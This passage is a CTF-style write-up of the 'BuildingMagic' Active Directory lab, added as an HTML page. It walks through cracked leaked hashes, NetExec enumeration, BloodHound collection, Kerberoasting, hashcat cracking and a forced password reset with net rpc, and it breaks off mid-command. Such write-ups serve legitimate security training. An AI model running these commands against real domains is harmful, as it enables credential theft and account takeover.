@@ -1,0 +1,1341 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="Full Active Directory compromise via Kerberoasting, ForceChangePassword, LLMNR poisoning, and SeBackupPrivilege abuse.">
+      
+      
+        <meta name="author" content="RodKast">
+      
+      
+        <link rel="canonical" href="https://RodKast.github.io/ctf-writeups/active-directory/hacksmarter/BuildingMagic_WriteUp/">
+      
+      
+        <link rel="prev" href="../../..">
+      
+      
+        <link rel="next" href="../../../web/">
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../../assets/fsociety.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.6">
+    
+    
+      
+        <title>BuildingMagic - Write Ups & InfoSec Notes</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.484c7ddc.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Inter:300,300i,400,400i,700,700i%7CJetBrains+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Inter";--md-code-font:"JetBrains Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../../assets/custom.css">
+    
+    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="black" data-md-color-accent="deep-purple">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#buildingmagic" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../../.." title="Write Ups &amp; InfoSec Notes" class="md-header__button md-logo" aria-label="Write Ups & InfoSec Notes" data-md-component="logo">
+      
+  <img src="../../../assets/fsociety.png" alt="logo">
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Write Ups & InfoSec Notes
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              BuildingMagic
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+    
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../.." title="Write Ups &amp; InfoSec Notes" class="md-nav__button md-logo" aria-label="Write Ups & InfoSec Notes" data-md-component="logo">
+      
+  <img src="../../../assets/fsociety.png" alt="logo">
+
+    </a>
+    Write Ups & InfoSec Notes
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Home
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Active Directory
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Active Directory
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_1" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_2_1" id="__nav_2_1_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    HackSmarter
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_1_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2_1">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    HackSmarter
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M5 3v18h6v-3.5h2V21h6V3zm2 2h2v2H7zm4 0h2v2h-2zm4 0h2v2h-2zM7 9h2v2H7zm4 0h2v2h-2zm4 0h2v2h-2zm-8 4h2v2H7zm4 0h2v2h-2zm4 0h2v2h-2zm-8 4h2v2H7zm8 0h2v2h-2z"/></svg>
+  
+  <span class="md-ellipsis">
+    
+  
+    BuildingMagic
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M5 3v18h6v-3.5h2V21h6V3zm2 2h2v2H7zm4 0h2v2h-2zm4 0h2v2h-2zM7 9h2v2H7zm4 0h2v2h-2zm4 0h2v2h-2zm-8 4h2v2H7zm4 0h2v2h-2zm4 0h2v2h-2zm-8 4h2v2H7zm8 0h2v2h-2z"/></svg>
+  
+  <span class="md-ellipsis">
+    
+  
+    BuildingMagic
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#setup" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Setup
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#1-credentials-analysis" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1. Credentials Analysis
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2-credentials-validation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2. Credentials Validation
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3-bloodhound-data-collection" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3. BloodHound Data Collection
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#4-bloodhound-analysis" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4. BloodHound Analysis
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#5-compromising-rhaggard-kerberoasting" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        5. Compromising r.haggard — Kerberoasting
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="5. Compromising r.haggard — Kerberoasting">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#cracking-the-hash" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Cracking the Hash
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#6-compromising-hpotch-forcechangepassword" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        6. Compromising h.potch — ForceChangePassword
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#7-capturing-hgrangon-llmnr-poisoning-via-slinky" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        7. Capturing h.grangon — LLMNR Poisoning via Slinky
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#8-post-exploitation-abusing-sebackupprivilege" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        8. Post-Exploitation — Abusing SeBackupPrivilege
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="8. Post-Exploitation — Abusing SeBackupPrivilege">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#dumping-the-sam-and-system-hives" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Dumping the SAM and SYSTEM Hives
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#9-domain-compromise-pass-the-hash-as-aflatch" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        9. Domain Compromise — Pass-the-Hash as a.flatch
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#10-root-flag" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        10. Root Flag
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#attack-chain-summary" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Attack Chain Summary
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#tools-used" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Tools Used
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Web
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Web
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../web/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Overview
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#setup" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Setup
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#1-credentials-analysis" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1. Credentials Analysis
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2-credentials-validation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2. Credentials Validation
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3-bloodhound-data-collection" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3. BloodHound Data Collection
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#4-bloodhound-analysis" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4. BloodHound Analysis
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#5-compromising-rhaggard-kerberoasting" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        5. Compromising r.haggard — Kerberoasting
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="5. Compromising r.haggard — Kerberoasting">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#cracking-the-hash" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Cracking the Hash
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#6-compromising-hpotch-forcechangepassword" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        6. Compromising h.potch — ForceChangePassword
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#7-capturing-hgrangon-llmnr-poisoning-via-slinky" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        7. Capturing h.grangon — LLMNR Poisoning via Slinky
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#8-post-exploitation-abusing-sebackupprivilege" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        8. Post-Exploitation — Abusing SeBackupPrivilege
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="8. Post-Exploitation — Abusing SeBackupPrivilege">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#dumping-the-sam-and-system-hives" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Dumping the SAM and SYSTEM Hives
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#9-domain-compromise-pass-the-hash-as-aflatch" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        9. Domain Compromise — Pass-the-Hash as a.flatch
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#10-root-flag" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        10. Root Flag
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#attack-chain-summary" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Attack Chain Summary
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#tools-used" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Tools Used
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h1 id="buildingmagic">BuildingMagic</h1>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Category</strong></td>
+<td>Active Directory Penetration Testing</td>
+</tr>
+<tr>
+<td><strong>Difficulty</strong></td>
+<td>Medium</td>
+</tr>
+<tr>
+<td><strong>Domain</strong></td>
+<td><code>BUILDINGMAGIC.LOCAL</code></td>
+</tr>
+<tr>
+<td><strong>Domain Controller</strong></td>
+<td><code>DC01</code> — <code>10.0.17.7</code></td>
+</tr>
+<tr>
+<td><strong>Objective</strong></td>
+<td>Full compromise of the Active Directory environment</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="setup">Setup</h2>
+<p>Add the following entries to <code>/etc/hosts</code> before starting:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>10.0.17.7   buildingmagic.local
+<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>10.0.17.7   dc01.buildingmagic.local
+</code></pre></div>
+<hr />
+<h2 id="1-credentials-analysis">1. Credentials Analysis</h2>
+<p>A leaked database was provided as the starting point, containing usernames and MD5-hashed passwords for 10 domain accounts.</p>
+<table>
+<thead>
+<tr>
+<th>ID</th>
+<th>Username</th>
+<th>Full Name</th>
+<th>Role</th>
+<th>MD5 Hash</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td>r.widdleton</td>
+<td>Ron Widdleton</td>
+<td>Intern Builder</td>
+<td><code>c4a21c4d...</code></td>
+</tr>
+<tr>
+<td>2</td>
+<td>n.bottomsworth</td>
+<td>Neville Bottomsworth</td>
+<td>Planner</td>
+<td><code>61ee643c...</code></td>
+</tr>
+<tr>
+<td>3</td>
+<td>l.layman</td>
+<td>Luna Layman</td>
+<td>Planner</td>
+<td><code>8960516f...</code></td>
+</tr>
+<tr>
+<td>4</td>
+<td>c.smith</td>
+<td>Chen Smith</td>
+<td>Builder</td>
+<td><code>bbd151e2...</code></td>
+</tr>
+<tr>
+<td>5</td>
+<td>d.thomas</td>
+<td>Dean Thomas</td>
+<td>Builder</td>
+<td><code>4d14ff3e...</code></td>
+</tr>
+<tr>
+<td>6</td>
+<td>s.winnigan</td>
+<td>Samuel Winnigan</td>
+<td>HR Manager</td>
+<td><code>078576a0...</code></td>
+</tr>
+<tr>
+<td>7</td>
+<td>p.jackson</td>
+<td>Parvati Jackson</td>
+<td>Shift Lead</td>
+<td><code>eada74b2...</code></td>
+</tr>
+<tr>
+<td>8</td>
+<td>b.builder</td>
+<td>Bob Builder</td>
+<td>Electrician</td>
+<td><code>dd4137ba...</code></td>
+</tr>
+<tr>
+<td>9</td>
+<td>t.ren</td>
+<td>Theodore Ren</td>
+<td>Safety Officer</td>
+<td><code>bfaf794a...</code></td>
+</tr>
+<tr>
+<td>10</td>
+<td>e.macmillan</td>
+<td>Ernest Macmillan</td>
+<td>Surveyor</td>
+<td><code>47d23284...</code></td>
+</tr>
+</tbody>
+</table>
+<p>After cracking the hashes offline, two valid plaintext credentials were recovered:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>r.widdleton:lilronron
+<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>t.ren:shadowhex7
+</code></pre></div>
+<hr />
+<h2 id="2-credentials-validation">2. Credentials Validation</h2>
+<p>SMB authentication was tested with <code>r.widdleton</code> using NetExec:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>nxc<span class="w"> </span>smb<span class="w"> </span>buildingmagic.local<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;r.widdleton&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;lilronron&#39;</span><span class="w"> </span>--shares
+</code></pre></div>
+<p><strong>Result:</strong> Authentication successful. Shares enumerated:</p>
+<table>
+<thead>
+<tr>
+<th>Share</th>
+<th>Permissions</th>
+<th>Remark</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>ADMIN$</td>
+<td>—</td>
+<td>Remote Admin</td>
+</tr>
+<tr>
+<td>C$</td>
+<td>—</td>
+<td>Default share</td>
+</tr>
+<tr>
+<td>File-Share</td>
+<td>—</td>
+<td>Central Repository of Building Magic's files</td>
+</tr>
+<tr>
+<td>IPC$</td>
+<td>READ</td>
+<td>Remote IPC</td>
+</tr>
+<tr>
+<td>NETLOGON</td>
+<td>—</td>
+<td>Logon server share</td>
+</tr>
+<tr>
+<td>SYSVOL</td>
+<td>—</td>
+<td>Logon server share</td>
+</tr>
+</tbody>
+</table>
+<blockquote>
+<p><strong>Note:</strong> <code>r.widdleton</code> had no write access to <code>File-Share</code> at this stage. Further enumeration was needed.</p>
+</blockquote>
+<hr />
+<h2 id="3-bloodhound-data-collection">3. BloodHound Data Collection</h2>
+<p>BloodHound data was collected over LDAP using the NetExec BloodHound module:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>nxc<span class="w"> </span>ldap<span class="w"> </span>dc01.buildingmagic.local<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;r.widdleton&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;lilronron&#39;</span><span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="w">  </span>--bloodhound<span class="w"> </span>--collection<span class="w"> </span>All<span class="w"> </span>--dns-server<span class="w"> </span><span class="m">10</span>.0.17.7
+</code></pre></div>
+<p>Collection methods resolved: <code>acl, adcs, container, dcom, group, localadmin, loggedon, objectprops, psremote, rdp, session, trusts</code></p>
+<blockquote>
+<p><strong>Note:</strong> ADCS enumeration returned 0 certificate templates and 0 Enterprise CAs — no ESC attack paths were available.</p>
+</blockquote>
+<hr />
+<h2 id="4-bloodhound-analysis">4. BloodHound Analysis</h2>
+<p><img alt="BloodHound node view for R.WIDDLETON" src="../images/bloodhound-widdleton-node.png" />
+<em>BloodHound node view for <code>R.WIDDLETON@BUILDINGMAGIC.LOCAL</code></em></p>
+<p>Analysis of <code>r.widdleton</code> showed:</p>
+<ul>
+<li>No write access over any AD objects</li>
+<li>Not a member of any privileged or interesting groups</li>
+<li><code>Password Never Expires: TRUE</code></li>
+<li><code>Do Not Require Pre-Authentication: FALSE</code></li>
+</ul>
+<p>BloodHound's <strong>Kerberoastable Users</strong> query revealed a single target:</p>
+<p><img alt="BloodHound Kerberoastable users query showing R.HAGGARD" src="../images/bloodhound-haggard-kerberoastable.png" />
+<em>BloodHound Pathfinding showing <code>R.HAGGARD@BUILDINGMAGIC.LOCAL</code> as the only Kerberoastable user</em></p>
+<p><strong>Attack path identified:</strong></p>
+<ol>
+<li>Kerberoast <code>r.haggard</code> to obtain and crack their TGS ticket</li>
+<li>Use <code>r.haggard</code>'s <code>ForceChangePassword</code> privilege to reset <code>h.potch</code>'s password</li>
+</ol>
+<hr />
+<h2 id="5-compromising-rhaggard-kerberoasting">5. Compromising <code>r.haggard</code> — Kerberoasting</h2>
+<p>Kerberoasting requests TGS tickets for accounts with SPNs set. These tickets are encrypted with the account's password hash and can be cracked offline.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>nxc<span class="w"> </span>ldap<span class="w"> </span>dc01.buildingmagic.local<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;r.widdleton&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;lilronron&#39;</span><span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="w">  </span>--kerberoasting<span class="w"> </span>output.txt
+</code></pre></div>
+<p>One Kerberoastable account was found:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>sAMAccountName : r.haggard
+<a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>memberOf       : []
+</code></pre></div>
+<p>The TGS ticket hash was captured into <code>output.txt</code>:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>$krb5tgs$23$*r.haggard$BUILDINGMAGIC.LOCAL$BUILDINGMAGIC.LOCAL\r.haggard*$9db208c5...
+</code></pre></div>
+<h3 id="cracking-the-hash">Cracking the Hash</h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">13100</span><span class="w"> </span>output.txt<span class="w"> </span>/usr/share/wordlists/rockyou.txt
+</code></pre></div>
+<blockquote>
+<p><strong>Cracked:</strong> <code>r.haggard : rubeushagrid</code></p>
+</blockquote>
+<p>SMB validation confirmed the credentials. <code>r.haggard</code> now has READ access to <code>NETLOGON</code> and <code>SYSVOL</code>.</p>
+<hr />
+<h2 id="6-compromising-hpotch-forcechangepassword">6. Compromising <code>h.potch</code> — ForceChangePassword</h2>
+<p>BloodHound revealed that <code>r.haggard</code> holds the <code>ForceChangePassword</code> edge over <code>h.potch</code>, meaning the password can be reset without knowing the current one.</p>
+<p><img alt="BloodHound ForceChangePassword abuse panel for H.POTCH" src="../images/bloodhound-potch-forcechangepassword.png" />
+<em>BloodHound abuse info panel for the ForceChangePassword edge on <code>H.POTCH@BUILDINGMAGIC.LOCAL</code></em></p>
+<p>Using Samba's <code>net rpc</code> tool:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>net<span class="w"> </span>rpc<span class="w"> </span>password<span class="w"> </span><span class="s2">&quot;h.potch&quot;</span><span class="w"> </span><span class="s1">&#39;NewPass!@&#39;</span><span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a><span class="w">  </span>-U<span class="w"> </span><span class="s2">&quot;buildingmagic.local&quot;</span>/<span class="s2">&quot;r.haggard&quot;</span>%<span class="s2">&quot;rubeushagrid&quot;</span><span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a><span class="w">  </span>-S<span class="w"> </span><span class="s1">&#39;10.0.17.7&#39;</span>
